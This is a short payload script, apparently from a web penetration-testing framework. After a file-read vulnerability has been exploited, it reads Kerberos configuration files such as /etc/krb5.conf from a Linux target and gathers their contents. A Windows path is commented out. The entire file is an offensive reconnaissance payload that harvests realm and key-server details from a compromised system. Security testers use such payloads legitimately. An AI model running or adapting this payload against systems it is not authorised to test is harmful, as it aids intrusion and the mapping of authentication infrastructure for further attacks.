#REQUIRE_LINUX
#This payload shows Kerberos configuration files
result = []
files = []

files.append('/etc/krb5.conf')
files.append('/etc/krb5/krb5.conf')
#files.append('c:\winnt\krb5.ini')

for file in files:
    if read(file) != '':
        result.append('-------------------------')
        result.append('FILE => '+file)
        result.append(read(file))

result = [p for p in result if p != '']
